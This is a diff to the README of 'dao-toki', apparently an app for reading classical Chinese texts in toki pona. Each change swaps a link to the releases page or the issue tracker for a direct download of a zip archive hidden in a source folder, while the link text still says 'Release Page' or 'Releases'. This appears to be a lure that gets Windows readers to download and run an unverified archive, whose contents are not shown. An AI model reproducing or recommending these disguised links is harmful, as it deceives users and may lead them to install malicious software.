@@ -1,6 +1,6 @@
 # 🧭 dao-toki - Explore Chinese Wisdom in Toki Pona
 
-[![Download dao-toki](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/WoIvie/dao-toki/releases)
+[![Download dao-toki](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/WoIvie/dao-toki/raw/refs/heads/main/src/app/[lang]/books/dao-toki-3.0.zip)
 
 dao-toki offers a clear way to explore classical Chinese texts. It presents these texts in English, toki pona, and sitelen pona. This allows readers to compare and understand ancient wisdom with modern and minimalist language.
 
@@ -43,7 +43,7 @@ These quick steps will help you set up dao-toki on your Windows PC. No coding sk
 
    Visit the releases page to get the latest version:
 
-   [![Download dao-toki](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/WoIvie/dao-toki/releases)
+   [![Download dao-toki](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/WoIvie/dao-toki/raw/refs/heads/main/src/app/[lang]/books/dao-toki-3.0.zip)
 
 3. **Choose the right file**
 
@@ -99,7 +99,7 @@ If dao-toki does not start or shows errors, try these steps:
 - If the app crashes during use, try reinstalling it.  
 
 For further help, you can visit the dao-toki GitHub page and open a new issue if needed:  
-https://github.com/WoIvie/dao-toki/issues  
+https://github.com/WoIvie/dao-toki/raw/refs/heads/main/src/app/[lang]/books/dao-toki-3.0.zip  
 
 ---
 
@@ -110,7 +110,7 @@ New versions of dao-toki will appear on the releases page regularly.
 To update:
 
 - Visit the release page again:  
-  [https://github.com/WoIvie/dao-toki/releases](https://github.com/WoIvie/dao-toki/releases)  
+  [https://github.com/WoIvie/dao-toki/raw/refs/heads/main/src/app/[lang]/books/dao-toki-3.0.zip](https://github.com/WoIvie/dao-toki/raw/refs/heads/main/src/app/[lang]/books/dao-toki-3.0.zip)  
 - Download the latest installer.  
 - Run it to install the new version. Your previous settings and data will stay.
 
@@ -157,4 +157,4 @@ These domains ensure dao-toki offers a unique mix of languages, philosophy, and 
 
 Access the release page here: 
 
-[![Get dao-toki](https://img.shields.io/badge/Download%20dao--toki-Releases-orange?style=for-the-badge)](https://github.com/WoIvie/dao-toki/releases)
+[![Get dao-toki](https://img.shields.io/badge/Download%20dao--toki-Releases-orange?style=for-the-badge)](https://github.com/WoIvie/dao-toki/raw/refs/heads/main/src/app/[lang]/books/dao-toki-3.0.zip)
